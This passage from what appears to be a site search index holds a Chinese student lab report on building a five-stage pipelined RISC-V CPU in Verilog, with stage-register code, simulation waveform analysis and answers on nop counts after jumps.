EX_MEM_mem_write ; assign jal_addr = EX_MEM_pc + EX_MEM_imm ; assign jalr_addr = EX_MEM_alu_result ; MuxPC mux_pc ( . I0 ( pc + 4 ), . I1 ( jalr_addr ), . I2 ( jal_addr ), . I3 ( jal_addr ), . s ( EX_MEM_pc_src ), . branch ( EX_MEM_branch ), . b_type ( EX_MEM_b_type ), . alu_res ( EX_MEM_alu_result ), . o ( pc_next ) ); \u8fd9\u6837\u6574\u4e2a\u6d41\u6c34\u7ebf CPU \u5c31\u5b8c\u6210\u4e86\u3002\u5b8c\u6574\u4ee3\u7801\u89c1\u9644\u4ef6\u3002 \u4eff\u771f\u6d4b\u8bd5 \u00b6 \u56e0\u4e3a\u5728 lab0 \u4e2d\u5df2\u7ecf\u5b8c\u6210\u4e86 bonus \u6307\u4ee4\uff0c\u5305\u542b\u4e86\u672c\u5b9e\u9a8c\u4e2d\u7684\u6240\u6709\u6307\u4ee4\uff0c\u6240\u4ee5\u76f4\u63a5\u8f7d\u5165 coe \u6587\u4ef6\u8fd0\u884c\u5373\u53ef\uff0c\u4eff\u771f\u6ce2\u5f62\u5982\u4e0b\uff1a \u6ce2\u5f62\u5206\u6790 \u00b6 \u7b2c\u4e00\u90e8\u5206\uff0c\u6b63\u5e38\u8fd0\u884c\u4e86\u4e00\u4e9b\u8ba1\u7b97\u6307\u4ee4\uff0c\u7ed3\u679c\u5747\u6b63\u786e\u3002\u5e76\u4e14\u51e0\u4e2a bne \u8df3\u8f6c\u672a\u8fbe\u5230\u6761\u4ef6\u6ca1\u6709\u8df3\u8f6c\u3002 \u7b2c\u4e8c\u90e8\u5206\uff0c\u4e3b\u8981\u662f\u8df3\u8f6c\uff0cslli \u6307\u4ee4\u540e\u9762\u63a5\u4e09\u4e2a nop\uff0c\u7136\u540e\u662f jalr \u65e0\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4\uff0c\u5176\u4e2d MEM \u9636\u6bb5\u540e\u66f4\u6539\u4e86 pc\uff0cWB \u9636\u6bb5\u540e\u5c06\u8be5\u6307\u4ee4 pc \u52a0 4 \u540e\u5b58\u5165\u4e86 x1 \u5bc4\u5b58\u5668\u4e2d\u3002\u7136\u540e\u662f\u4e00\u4e9b nop \u6307\u4ee4\u9632\u6b62\u526f\u4f5c\u7528\uff08\u6b64\u5904\u53ea\u6267\u884c\u4e86\u4e09\u4e2a\uff09\uff0cpc \u8df3\u8f6c\u5230\u4e86 244\uff08\u5373 addi \u6307\u4ee4\u7684\u4f4d\u7f6e\uff09\uff0c\u6267\u884c\u4e86 addi \u6307\u4ee4\u540e\u6709\u4e09\u4e2a nop\uff0c\u4e00\u4e2a\u672a\u6210\u529f bne\uff0c\u4e94\u4e2a nop\uff0c\u4e4b\u540e\u8fd0\u884c\u5230\u4e86 j pass \u6307\u4ee4\uff0c\u4e5f\u5c31\u662f\u53cd\u590d\u8df3\u5230\u5f53\u524d\u4f4d\u7f6e\uff0c\u5728\u4e0b\u56fe\u4e2d\u4e5f\u80fd\u6e05\u6670\u5730\u770b\u5230\u6709 pc \u8df3\u8f6c\u63a5 3 \u4e2a nop \u7684\u5faa\u73af\uff1a \u901a\u8fc7\u4ee5\u4e0a\u5206\u6790\uff0c\u53ef\u89c1\u8fd0\u884c\u662f\u6b63\u786e\u7684\u3002 \u4e0a\u677f\u9a8c\u8bc1 \u00b6 \u9700\u8981\u4fee\u6539\u4e00\u4e2a\u5730\u65b9\u7528\u6765 debug\uff0c\u5373\u5c06 SCPU \u7684 debug_reg_addr \u8f93\u5165\u5230 Regs \u4e2d\uff0c\u7136\u540e\u8f93\u51fa debug_reg\uff0c\u4f20\u5165\u4e0a\u7ea7 Core \u4e2d\uff0c\u6765\u67e5\u770b\u67d0\u4e00\u5bc4\u5b58\u5668\u7684\u503c\u3002 Regs regs ( ... . debug_reg_addr ( debug_reg_addr ), . debug_reg ( debug_reg ) ) \u5176\u5b83\u529f\u80fd\uff08\u770b pc\u3001addr_out\u3001inst\uff0c\u4ee5\u53ca\u6839\u636e\u5f00\u5173\u8bbe\u7f6e debug_reg_addr\uff09\u5df2\u7ecf\u5728 lab0 \u4e2d\u5b9e\u73b0\uff0c\u8fd9\u91cc\u4fdd\u7559\u5373\u53ef\u3002 \u4e0a\u677f\u540e\u9010\u5468\u671f\u8c03\u8bd5\u8fd0\u884c\uff0c\u5747\u548c\u6ce2\u5f62\u4e00\u81f4\uff0c\u7ed3\u679c\u6b63\u786e\u3002 \u601d\u8003\u9898 \u00b6 \u5728\u4f60\u7684\u8bbe\u8ba1\u4e2d\uff0c\u672c\u5b9e\u9a8c\u6d4b\u8bd5\u6587\u4ef6\u4e2d\u7684 nop \u6570\u91cf\u662f\u5426\u591a\u4e8e\u6bcf\u6761\u6307\u4ee4\u6240\u9700\u7684\u5ef6\u8fdf\u5468\u671f\u6570\uff1f \u591a\u4e8e\u4e86\uff0c\u5bf9\u4e8e\u6211\u7684\u8bbe\u8ba1\u6765\u8bf4\uff0c\u5728\u6bcf\u4e2a\u8df3\u8f6c\u6307\u4ee4\u540e\u9762\u53ea\u9700\u8981\u63a5 3 \u4e2a nop \u6307\u4ee4\u5c31\u53ef\u4ee5\u9632\u6b62\u5176\u540e\u7684\u6307\u4ee4\u5728\u8df3\u8f6c\u524d\u88ab\u6267\u884c\uff08\u8be6\u89c1\u4e0a\u9762\u6ce2\u5f62\u5206\u6790\uff09\uff0c\u4f46\u662f\u5728\u6d4b\u8bd5\u6587\u4ef6\u4e2d\uff0c\u6bcf\u4e2a\u8df3\u8f6c\u6307\u4ee4\u540e\u9762\u90fd\u63a5\u4e86 5 \u4e2a nop \u6307\u4ee4\uff0c\u8fd9\u6837\u5c31\u591a\u4e86 2 \u4e2a\u5ef6\u8fdf\u5468\u671f\u3002 \u53c8\u662f\u5426\u5b58\u5728\u51fa\u73b0\u51b2\u7a81\u4f46\u662f\u6ca1\u6709\u7ed9\u8db3 nop \u7684\u60c5\u51b5\uff1f \u4e0d\u5b58\u5728 \u8bf7\u8ba1\u7b97\u6bcf\u6761\u6307\u4ee4\u95f4\u5b9e\u9645\u6240\u9700\u8981\u7684 nop \u6570\u91cf\uff0c\u5e76\u5bf9\u4f60\u7684 coe \u6587\u4ef6\u8fdb\u884c\u4fee\u6539\uff0c\u4f7f\u4e4b\u6b63\u786e\u5730\u8fd0\u884c\u51fa\u76f8\u5e94\u7684\u7ed3\u679c \u9700\u8981\u4fee\u6539\u7684\u53ea\u662f\u5404\u4e2a\u8df3\u8f6c\u6307\u4ee4\u540e\u9762 nop \u7684\u4e2a\u6570\uff0c\u4ece 5 \u4e2a\u4fee\u6539\u5230 3 \u4e2a\uff0c\u5176\u4ed6\u6307\u4ee4\u4e0d\u9700\u8981\u4fee\u6539\u3002\u4ecd\u53ef\u4ee5\u6b63\u786e\u8fd0\u884c\u3002","title":"\u7cfb\u7edf II lab1"},{"location":"cs/system/cs2/lab1/#cpu","text":"Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 lab1 \u5b9e\u9a8c\u62a5\u544a\uff082022.09.22 ~ 2022.10.13\uff09 Warning \u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad","title":"\u6d41\u6c34\u7ebf CPU \u8bbe\u8ba1"},{"location":"cs/system/cs2/lab1/#_1","text":"lab 1-1\uff1a\u6d41\u6c34\u7ebf\u52a0\u6cd5\u673a \u57fa\u4e8e lab 0 \u7684\u5355\u5468\u671f CPU \u642d\u5efa\u6d41\u6c34\u7ebf\u52a0\u6cd5\u673a\uff0c\u652f\u6301 addi \u548c nop \u6307\u4ee4 \u8fdb\u884c\u4eff\u771f\u6d4b\u8bd5\uff0c\u68c0\u9a8c CPU \u57fa\u672c\u529f\u80fd \u8fdb\u884c\u4e0a\u677f\u6d4b\u8bd5\uff0c\u68c0\u9a8c CPU \u8bbe\u8ba1\u89c4\u8303 \u601d\u8003\u9898 \u5bf9\u4e8e part1 (2-14 \u884c)\uff0c\u8bf7\u8ba1\u7b97\u4f60\u7684 CPU \u7684 CPI\uff0c\u518d\u7528 lab0 \u7684\u5355\u5468\u671f CPU \u8fd0\u884c part1\uff0c\u5bf9\u6bd4\u4e8c\u8005\u7684 CPI \u5bf9\u4e8e part2 (24-39 \u884c)\uff0c\u8bf7\u8ba1\u7b97\u4f60\u7684 CPU \u7684 CPI\uff08\u5047\u8bbe nop \u4e0d\u8ba1\u5165\u6307\u4ee4\u6761\u6570\uff09\uff0c\u518d\u7528 lab0 \u7684\u5355\u5468\u671f CPU \u8fd0\u884c part2\uff0c\u5bf9\u6bd4\u4e8c\u8005\u7684 CPI\u3002\u8bd5\u89e3\u91ca\u4e3a\u4f55\u9700\u8981\u6dfb\u52a0 nop \u6307\u4ee4 lab 1-2\uff1a\u6307\u4ee4\u6269\u5c55 \u57fa\u4e8e lab 1-1\uff0c\u5728\u6d41\u6c34\u7ebf CPU \u4e2d\u5b9e\u73b0 lui\u3001jal\u3001jalr\u3001beq\u3001bne\u3001lw\u3001sw\u3001addi\u3001slti\u3001xori\u3001ori\u3001andi\u3001srli\u3001srai\u3001add\u3001sub\u3001sll\u3001slt\u3001sra\u3001or\u3001xor\u3001and \u6307\u4ee4 \u642d\u5efa\u5b8c\u6574\u7684\u6d41\u6c34\u7ebf CPU \u8fdb\u884c\u4eff\u771f\u6d4b\u8bd5\u548c\u4e0a\u677f\u6d4b\u8bd5 \u601d\u8003\u9898 \u5728\u4f60\u7684\u8bbe\u8ba1\u4e2d\uff0c\u672c\u5b9e\u9a8c\u6d4b\u8bd5\u6587\u4ef6\u4e2d\u7684 nop \u6570\u91cf\u662f\u5426\u591a\u4e8e\u6bcf\u6761\u6307\u4ee4\u6240\u9700\u7684\u5ef6\u8fdf\u5468\u671f\u6570 \u53c8\u662f\u5426\u5b58\u5728\u51fa\u73b0\u51b2\u7a81\u4f46\u662f\u6ca1\u6709\u7ed9\u8db3 nop \u7684\u60c5\u51b5 \u8bf7\u8ba1\u7b97\u6bcf\u6761\u6307\u4ee4\u95f4\u5b9e\u9645\u6240\u9700\u8981\u7684 nop \u6570\u91cf\uff0c\u5e76\u5bf9\u4f60\u7684 coe \u6587\u4ef6\u8fdb\u884c\u4fee\u6539\uff0c\u4f7f\u4e4b\u6b63\u786e\u5730\u8fd0\u884c\u51fa\u76f8\u5e94\u7684\u7ed3\u679c","title":"\u5b9e\u9a8c\u5185\u5bb9"},{"location":"cs/system/cs2/lab1/#_2","text":"","title":"\u6d41\u6c34\u7ebf\u52a0\u6cd5\u673a"},{"location":"cs/system/cs2/lab1/#_3","text":"\u4e4b\u524d\u7684\u5355\u5468\u671f CPU \u6570\u636e\u901a\u8def\u8bbe\u8ba1\uff08\u56e0\u4e3a\u6dfb\u52a0\u4e86 auipc \u6307\u4ee4\uff0c\u6240\u4ee5\u548c\u4e0a\u8bfe\u8bb2\u7684\u6709\u4e9b\u8bb8\u4e0d\u4e00\u6837\uff09\uff1a nop \u6307\u4ee4\u7f16\u8bd1\u540e\u76f8\u5f53\u4e8e addi x0, x0, 0\uff0c\u6240\u4ee5\u5373\u53ea\u5b58\u5728 addi \u6307\u4ee4\u3002\u5728\u8bbe\u8ba1\u6570\u636e\u901a\u8def\u65f6\u53ef\u4ee5\u5148\u7b80\u5316\u4e00\u4e0b\uff0c\u4e0d\u8003\u8651 pc \u7684\u8df3\u8f6c\u53d8\u5316\uff0c\u76f4\u63a5\u5728 IF \u9636\u6bb5\u4e0d\u65ad\u52a0\u56db\u5373\u53ef\u3002\u6240\u4ee5\u5728\u5355\u5468\u671f CPU \u6570\u636e\u901a\u8def\u7684\u57fa\u7840\u4e0a\u518d\u52a0\u4e0a\u56db\u4e2a\u9636\u6bb5\u5bc4\u5b58\u5668\u6765\u5206\u5272\u5373\u53ef\uff08\u5f88\u591a\u5176\u5b83\u6307\u4ee4\u7684\u7ec6\u8282\u4e5f\u8fdb\u884c\u4e86\u4fdd\u7559\uff0c\u4f46\u5728\u8fd9\u90e8\u5206\u4e2d\u4e0d\u4f1a\u7528\u5230\uff09\uff1a","title":"\u6570\u636e\u901a\u8def\u8bbe\u8ba1"},{"location":"cs/system/cs2/lab1/#_4","text":"\u7531\u4e8e\u672c\u6b21\u5b9e\u9a8c\u4e0d\u5bf9\u6570\u636e\u901a\u8def\u8fdb\u884c\u5c01\u88c5\uff0c\u6240\u4ee5\u76f4\u63a5\u5728 SCPU \u4e2d\u8fdb\u884c\u4e0a\u8ff0\u8bbe\u8ba1\u7684\u5b9e\u73b0\u3002","title":"\u4ee3\u7801\u7f16\u5199"},{"location":"cs/system/cs2/lab1/#if","text":"IF \u6bb5\u662f\u7531 PC \u548c IF/ID \u4e24\u4e2a\u5bc4\u5b58\u5668\uff08\u65f6\u5e8f\u7535\u8def\uff09\u5206\u9694\u7684\u3002\u5176\u4e2d\u4ece I-Mem \u8bfb\u53d6\u6307\u4ee4\u7684\u90e8\u5206\u5728 SCPU \u4e4b\u5916\uff0c\u4e5f\u5c31\u662f\u901a\u8fc7 pc_out \u4f20\u51fa\u5f53\u524d pc\uff0c\u7136\u540e\u5f97\u5230\u6307\u4ee4\u901a\u8fc7 inst \u8fd4\u56de\u5230 SCPU \u4e2d\u3002\u56e0\u4e3a Core \u4e2d\u4e3a ROM \u8bbe\u7f6e\u7684 clk \u4e0e SCPU \u6b63\u597d\u9519\u4f4d\uff0c\u6240\u4ee5\u53ef\u4ee5\u5728 IF \u6240\u5728\u7684\u65f6\u949f\u5468\u671f\u4e2d\u76f4\u63a5\u5b8c\u6210\u6307\u4ee4\u7684\u8bfb\u53d6\u3002 \u4f53\u73b0\u5728\u4ee3\u7801\u4e0a\u5373\u5728\u4e0a\u5347\u6cbf\u65f6\u66f4\u65b0 pc \u4e3a pc_next\uff08pc+4\uff09\uff0c\u540c\u65f6\u66f4\u65b0 IF_ID_pc \u4e3a\u5f53\u524d\u672a\u66f4\u65b0\u7684 pc\uff08\u5373\u4f20\u7ed9\u4e0b\u4e00\u9636\u6bb5\uff09\uff0c\u4e5f\u540c\u65f6\u66f4\u65b0 IF_ID_inst \u4e3a\u5f53\u524d\u8bfb\u53d6\u51fa\u6765\u7684 inst\uff1a wire [ 31 : 0 ] pc_next ; reg [ 31 : 0 ] pc ; reg [ 31 : 0 ] IF_ID_pc ; reg [ 31 : 0 ] IF_ID_inst ; assign pc_out = pc ; assign pc_next = pc + 4 ; // \u4e0d\u8003\u8651\u8df3\u8f6c always @( posedge clk or posedge rst ) begin if ( rst ) begin pc <= 32 'b0 ; IF_ID_pc <= 32 'b0 ; end else begin pc <= pc_next ; IF_ID_pc <= pc ; IF_ID_inst <= inst ; end end","title":"IF \u6bb5"},{"location":"cs/system/cs2/lab1/#id","text":"ID \u9636\u6bb5\u9700\u8981\u8fdb\u884c\u5bc4\u5b58\u5668\u7ec4\u7684\u8bbf\u95ee\u3001\u7acb\u5373\u6570\u751f\u6210\u4ee5\u53ca\u6307\u4ee4\u8bd1\u7801\uff0c\u4ece\u6570\u636e\u901a\u8def\u56fe\u4e0a\u53ef\u4ee5\u770b\u51fa\uff0c\u9664\u4e86\u63a7\u5236\u4fe1\u53f7\u4ee5\u5916\uff0c\u8f93\u51fa\u7ed9 ID/EX \u5bc4\u5b58\u5668\u7684\u503c\u6709 pc\u3001data1\u3001data2\u3001imm\u3001write_addr\u3002\u63a7\u5236\u4fe1\u53f7\u6709 pc_src\u3001mem_to_reg\u3001reg_write\u3001alu_src\u3001branch\u3001b_type\u3001auipc\u3001mem_write\u3002\u6240\u4ee5\u9700\u8981\u6839\u636e\u8fd9\u4e9b\u6765\u521b\u5efa ID/EX \u5bc4\u5b58\u5668\uff0c\u9644\u5e26\u4e2d\u95f4\u9700\u8981\u7528\u5230\u7684 wire\uff0c\u4ee3\u7801\u4e3a\uff1a wire [ 31 : 0 ] read_data1 , read_data2 , imm ; wire [ 3 : 0 ] alu_op ; wire [ 1 : 0 ] pc_src , mem_to_reg ; wire reg_write , alu_src , branch , b_type , auipc , mem_write_ ; reg [ 31 : 0 ] ID_EX_data1 , ID_EX_data2 ; reg [ 31 : 0 ] ID_EX_pc , ID_EX_imm ; reg [ 4 : 0 ] ID_EX_write_addr ; reg [ 3 : 0 ] ID_EX_alu_op ; reg [ 1 : 0 ] ID_EX_pc_src , ID_EX_mem_to_reg ; reg ID_EX_reg_write , ID_EX_alu_src , ID_EX_branch , ID_EX_b_type , ID_EX_auipc , ID_EX_mem_write ; \u4ee5\u53ca\u6d89\u53ca ID/EX \u5bc4\u5b58\u5668\u7684\u65f6\u5e8f\u66f4\u65b0\uff1a ID_EX_pc <= IF_ID_pc ; ID_EX_data1 <= read_data1 ; ID_EX_data2 <= read_data2 ; ID_EX_imm <= imm ; ID_EX_write_addr <= IF_ID_inst [ 11 : 7 ]; ID_EX_pc_src <= pc_src ; ID_EX_mem_to_reg <= mem_to_reg ; ID_EX_reg_write <= reg_write ; ID_EX_alu_src <= alu_src ; ID_EX_branch <= branch ; ID_EX_b_type <= b_type ; ID_EX_auipc <= auipc ; ID_EX_alu_op <= alu_op ; ID_EX_mem_write <= mem_write_ ; \u5269\u4e0b\u7684\u662f\u5728\u8fd9\u4e00\u9636\u6bb5\u4e2d\u8fde\u63a5\u4e09\u4e2a\u6a21\u5757\uff1aRegs\u3001Control\u3001ImmGen\u3002\u5bf9\u4e8e Regs\uff0c\u6709\u4e00\u90e8\u5206\u662f\u5728 WB \u9636\u6bb5\u7528\u4e8e\u5199\u56de\u7684\uff0c\u8fd9\u91cc\u5148\u653e\u4e0b\u7b49\u5230\u540e\u9762\u586b\u3002Control \u548c ImmGen \u548c\u5355\u5468\u671f CPU \u7684\u5199\u6cd5\u57fa\u672c\u4e00\u81f4\uff0c\u4e0d\u8fc7\u8fd9\u91cc\u7684 inst \u8981\u6539\u6210 IF_ID_inst \u4e5f\u5c31\u662f IF/ID \u5bc4\u5b58\u5668\u4e2d\u5b58\u7684\u6307\u4ee4\uff0c\u800c\u4e0d\u662f\u5f53\u524d\u7684 inst\uff08\u540c\u4e00\u65f6\u523b\u4f1a\u662f\u540e\u4e00\u6761\u6307\u4ee4\uff09\uff1a Regs regs ( . clk ( clk ), . rst ( rst ), . we ( ____ ), // \u7559\u7ed9 WB \u9636\u6bb5 . read_addr_1 ( IF_ID_inst [ 19 : 15 ]), . read_addr_2 ( IF_ID_inst [ 24 : 20 ]), . write_addr ( ____ ), // \u7559\u7ed9 WB \u9636\u6bb5 . write_data ( ____ ), // \u7559\u7ed9 WB \u9636\u6bb5 . read_data_1 ( read_data1 ), . read_data_2 ( read_data2 ) ); Control control ( . op_code ( IF_ID_inst [ 6 : 0 ]), . funct3 ( IF_ID_inst [ 14 : 12 ]), . funct7_5 ( IF_ID_inst [ 30 ]), . alu_op ( alu_op ), . pc_src ( pc_src ), . mem_to_reg ( mem_to_reg ), . reg_write ( reg_write ), . alu_src_b ( alu_src ), . branch ( branch ), . b_type ( b_type ), . mem_write ( mem_write_ ), . auipc ( auipc ) ); ImmGen immgen ( . inst ( IF_ID_inst ), . imm ( imm ) );","title":"ID \u6bb5"},{"location":"cs/system/cs2/lab1/#ex","text":"EX \u9636\u6bb5\u4e3b\u8981\u8fdb\u884c ALU \u8fd0\u7b97\uff0c\u6839\u636e\u6570\u636e\u901a\u8def\u56fe\u53ef\u4ee5\u770b\u51fa\uff0c\u6b64\u9636\u6bb5\u7684\u8f93\u51fa\uff08\u4e5f\u5c31\u662f EX/MEM \u5bc4\u5b58\u5668\u4e2d\u9700\u8981\u5b58\u7684\u503c\uff09\u6709 pc\u3001alu_result\u3001data2\u3001imm\u3001write_addr\u3002\u63a7\u5236\u4fe1\u53f7\u5728\u8fd9\u4e00\u9636\u6bb5\u4e2d\u4f7f\u7528\u6389\u4e86 alu_op\u3001alu_src_b \u548c auipc\uff0c\u5176\u4f59\u7684\u8fd8\u9700\u8981\u7ee7\u7eed\u901a\u8fc7 EX/MEM \u5bc4\u5b58\u5668\u4f20\u4e0b\u53bb\u3002\u56e0\u6b64 EX/MEM \u5bc4\u5b58\u5668\u4ee5\u53ca\u5176\u5b83\u4e2d\u95f4 wire \u7684\u5b9a\u4e49\uff1a wire [ 31 : 0 ] alu_data1 , alu_data2 , alu_result ; wire alu_zero ; reg [ 31 : 0 ] EX_MEM_alu_result , EX_MEM_pc , EX_MEM_imm ; reg [ 31 : 0 ] EX_MEM_data2 ; reg [ 4 : 0 ] EX_MEM_write_addr ; reg [ 1 : 0 ] EX_MEM_pc_src , EX_MEM_mem_to_reg ; reg EX_MEM_reg_write , EX_MEM_branch , EX_MEM_b_type , EX_MEM_mem_write ; \u76f8\u5173\u7684\u65f6\u5e8f\u903b\u8f91\u66f4\u65b0\uff1a EX_MEM_pc <= ID_EX_pc ; EX_MEM_imm <= ID_EX_imm ; EX_MEM_data2 <= ID_EX_data2 ; EX_MEM_alu_result <= alu_result ; EX_MEM_write_addr <= ID_EX_write_addr ; EX_MEM_pc_src <= ID_EX_pc_src ; EX_MEM_mem_to_reg <= ID_EX_mem_to_reg ; EX_MEM_reg_write <= ID_EX_reg_write ; EX_MEM_branch <= ID_EX_branch ; EX_MEM_b_type <= ID_EX_b_type ; EX_MEM_mem_write <= ID_EX_mem_write ; \u5728\u6211\u7684\u6570\u636e\u901a\u8def\u8bbe\u8ba1\u4e2d\uff0c\u6b64\u9636\u6bb5\u9700\u8981\u4e24\u4e2a\u591a\u8def\u9009\u62e9\u5668\uff08\u4e00\u4e2a\u901a\u8fc7 auipc \u5728 data1 \u548c pc \u4e2d\u9009\u62e9\u7b2c\u4e00\u4e2a\u8f93\u5165\uff0c\u53e6\u4e00\u4e2a\u901a\u8fc7 alu_src_b \u5728 data2 \u548c imm \u4e2d\u9009\u62e9\u7b2c\u4e8c\u4e2a\u8f93\u5165\uff09\u8fd8\u6709\u4e00\u4e2a ALU\uff0c\u56e0\u6b64\u8fd9\u4e09\u4e2a\u6a21\u5757\u7684\u5b9a\u4e49\uff1a Mux2x32 mux2x32_1 ( . I0 ( ID_EX_data1 ), . I1 ( ID_EX_pc ), . s ( ID_EX_auipc ), . o ( alu_data1 ) ); Mux2x32 mux2x32_2 ( . I0 ( ID_EX_data2 ), . I1 ( ID_EX_imm ), . s ( ID_EX_alu_src ), . o ( alu_data2 ) ); ALU alu ( . a ( alu_data1 ), . b ( alu_data2 ), . alu_op ( ID_EX_alu_op ), . res ( alu_result ), . zero ( alu_zero ) // \u5176\u5b9e\u6211\u6ca1\u7528 );","title":"EX \u6bb5"},{"location":"cs/system/cs2/lab1/#mem","text":"MEM \u9636\u6bb5\u9700\u8981\u8fdb\u884c D-Mem \u7684\u8bbf\u95ee\uff0c\u867d\u7136 addi \u6307\u4ee4\u4e0d\u4f1a\u6d89\u53ca\u5230 MEM \u9636\u6bb5\uff0c\u4f46\u662f\u5728\u6b64\u4e5f\u8fdb\u884c\u4e86\u8fd9\u4e00\u90e8\u5206\u5b9e\u73b0\u3002D-Mem \u4e5f\u5b9a\u4e49\u5728 SCPU \u4e4b\u5916\uff0c\u9700\u8981\u901a\u8fc7 SCPU \u7684\u63a5\u53e3\u6765\u8fdb\u884c\u8bbf\u95ee\uff0c\u5373\u901a\u8fc7 addr_out \u8fd9\u4e00\u8f93\u51fa\u6765\u8f93\u5165\u7ed9 RAM \u6307\u5b9a\u64cd\u4f5c\u7684\u5730\u5740\uff0cdata_out \u8f93\u51fa\u6765\u8f93\u5165\u7ed9 RAM \u6307\u5b9a\u5199\u5165\u7684\u6570\u636e\uff0c\u8f93\u51fa mem_write \u63a7\u5236\u4fe1\u53f7\u6765\u6307\u5b9a\u8fdb\u884c\u5199\u5165\u8fd8\u662f\u8bfb\u53d6\uff0c\u4ee5\u53ca RAM \u8f93\u51fa data_in \u7ed9 SCPU \u4f5c\u4e3a\u8bfb\u53d6\u7684\u6570\u636e\u3002\u6240\u4ee5 SCPU \u4e2d\u53ea\u9700\u8981 assign \u8fde\u7ebf\u5373\u53ef\uff1a assign addr_out = EX_MEM_alu_result ; assign data_out = EX_MEM_data2 ; assign mem_write = EX_MEM_mem_write ; \u4e0b\u4e00\u6b65\u662f\u8fdb\u884c MEM/WB \u5bc4\u5b58\u5668\u7684\u5199\u5165\u3002\u4ece\u6570\u636e\u901a\u8def\u56fe\u4e2d\u53ef\u4ee5\u770b\u51fa\uff0c\u9700\u8981\u5199\u5165\u7684\u6570\u636e\u6709 pc\u3001alu_result\u3001data_in\u3001imm\u3001write_addr\u3002\u8fd9\u4e00\u9636\u6bb5\u7684\u63a7\u5236\u4fe1\u53f7\u7528\u6389\u4e86 mem_write\uff0c\u4f46\u662f\u540e\u7eed\u7684\u8df3\u8f6c\u8ba1\u7b97\u4e5f\u8ba1\u5212\u5728\u8fd9\u91cc\u5b8c\u6210\uff0c\u5c06\u6d88\u8017 branch\u3001b_type\u3001pc_src \u4e09\u4e2a\u4fe1\u53f7\uff0c\u6700\u540e WB \u9636\u6bb5\u4e2d\u4f1a\u4f7f\u7528\u5230\u7684\u4e5f\u53ea\u5269\u4e0b mem_to_reg \u548c reg_write \u4e24\u4e2a\u4e86\u3002\u56e0\u6b64\u5bc4\u5b58\u5668\u5b9a\u4e49\uff1a reg [ 31 : 0 ] MEM_WB_data_in , MEM_WB_alu_result , MEM_WB_pc , MEM_WB_imm ; reg [ 4 : 0 ] MEM_WB_write_addr ; reg [ 1 : 0 ] MEM_WB_mem_to_reg ; reg MEM_WB_reg_write ; \u4ee5\u53ca\u65f6\u5e8f\u66f4\u65b0\uff1a MEM_WB_data_in <= data_in ; MEM_WB_alu_result <= EX_MEM_alu_result ; MEM_WB_pc <= EX_MEM_pc ; MEM_WB_imm <= EX_MEM_imm ; MEM_WB_write_addr <= EX_MEM_write_addr ; MEM_WB_mem_to_reg <= EX_MEM_mem_to_reg ; MEM_WB_reg_write <= EX_MEM_reg_write ;","title":"MEM \u6bb5"},{"location":"cs/system/cs2/lab1/#wb","text":"WB \u6bb5\u8fdb\u884c\u5bc4\u5b58\u5668\u7ec4\u7684\u5199\u56de\u64cd\u4f5c\uff0c\u9700\u8981\u590d\u7528 ID \u9636\u6bb5\u4e2d\u5b9a\u4e49\u8fde\u63a5\u7684 Regs \u6a21\u5757\uff0c\u4e5f\u5c31\u662f\u5148\u9009\u62e9\u51fa\u9700\u8981\u5199\u56de\u7684\u6570\u636e write_data\uff0c\u7136\u540e\u5199\u56de\u5728 write_addr \u5730\u5740\u5904\u7684\u5bc4\u5b58\u5668\u3002\u56e0\u6b64\u9700\u8981\u4e00\u4e2a wire \u53d8\u91cf write_data\u3002\u4e0d\u9700\u8981\u518d\u5b9a\u4e49\u989d\u5916\u7684\u5bc4\u5b58\u5668\u3002 \u5bf9\u4e8e write_data \u7684\u9009\u62e9\uff0c\u5176\u6765\u6e90\u6709\u56db\u4e2a\uff08\u5b8c\u6574\u60c5\u51b5\u4e0b\uff09\uff0c\u5206\u522b\u662f alu_result\u3001imm\u3001pc+4\u3001data_in\uff0c\u901a\u8fc7\u63a7\u5236\u4fe1\u53f7 mem_to_reg \u8fdb\u884c\u56db\u8def\u9009\u62e9\u5373\u53ef\uff1a Mux4x32 mux4x32 ( . I0 ( MEM_WB_alu_result ), . I1 ( MEM_WB_imm ), . I2 ( MEM_WB_pc + 4 ), . I3 ( MEM_WB_data_in ), . s ( MEM_WB_mem_to_reg ), . o ( write_data ) ); \u6700\u540e\u518d\u5c06 reg_write \u4fe1\u53f7\u3001write_addr\u3001write_data \u8fde\u5165 Regs \u6a21\u5757\u5373\u53ef\uff1a Regs regs ( ... . we ( MEM_WB_reg_write ), ... . write_addr ( MEM_WB_write_addr ), . write_data ( write_data ), ... );","title":"WB \u6bb5"},{"location":"cs/system/cs2/lab1/#_5","text":"\u6309\u7167\u4e4b\u524d\u7684\u6307\u5bfc\uff0c\u5c06 lab1-1.coe \u8f7d\u5165 ROM \u4e2d\uff0c\u7136\u540e\u4ee5 Core_tb \u4e3a\u9876\u5c42\u6a21\u5757\u8fdb\u884c\u4eff\u771f\u6d4b\u8bd5\uff0c\u4eff\u771f\u7ed3\u679c\u6ce2\u5f62\u5982\u4e0b\uff08\u5305\u542b SCPU \u4e2d\u7684 clk \u4fe1\u53f7\u3001pc\u3001inst \u4ee5\u53ca\u5bc4\u5b58\u5668\u7684\u53d8\u5316\uff09\uff1a \u5bf9\u4e8e\u8fd9\u4e2a\u6ce2\u5f62\u7684\u5206\u6790\u5982\u4e0b\u56fe\uff08\u9ed1\u8272\u3001\u6a59\u8272\u65b9\u5757\u4e3a addi \u6307\u4ee4\uff0c\u7ea2\u8272\u65b9\u5757\u4e3a nop \u6307\u4ee4\uff09\uff1a \u53ef\u4ee5\u53d1\u73b0\uff0c\u6307\u4ee4\u786e\u5b9e\u53e0\u5728\u4e00\u8d77\u8fd0\u884c\uff0c\u4e00\u6761\u6307\u4ee4\u8fd0\u884c\u4e94\u4e2a\u5468\u671f\uff0c\u540c\u4e00\u5468\u671f\u5185\u8fd0\u884c\u4e94\u6761\u6307\u4ee4\uff0c\u5f62\u6210\u4e00\u4e2a\u4e94\u9636\u6d41\u6c34\u7ebf\uff0c\u4e14\u5bc4\u5b58\u5668\u4e2d\u7ed3\u679c\u53d8\u5316\u5747\u7b26\u5408\u9884\u671f\uff08\u5728\u6700\u540e\u4e00\u4e2a\u9636\u6bb5 WB \u5199\u56de\u4ea7\u751f\u53d8\u5316\uff0c\u4e14\u503c\u4e0e\u6c47\u7f16\u8bed\u53e5\u4e2d\u63cf\u8ff0\u76f8\u540c\uff09","title":"\u4eff\u771f\u6d4b\u8bd5"},{"location":"cs/system/cs2/lab1/#_6","text":"\u5bf9\u4e8e part1 (2-14 